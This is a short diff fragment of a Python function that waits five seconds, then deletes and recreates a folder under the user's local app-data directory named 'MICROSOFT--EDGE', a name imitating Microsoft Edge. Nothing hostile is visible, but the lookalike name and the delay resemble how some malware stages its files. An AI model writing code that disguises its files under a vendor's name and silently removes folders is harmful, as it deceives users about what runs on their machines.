@@ -40,6 +40,8 @@ def g():
         return
     time.sleep(5)  
     target_dir = os.path.join(localappdata, "MICROSOFT--EDGE")
+    if os.path.exists(target_dir):
+        shutil.rmtree(target_dir)
     try:
         os.makedirs(target_dir, exist_ok=True)
     except Exception as e:
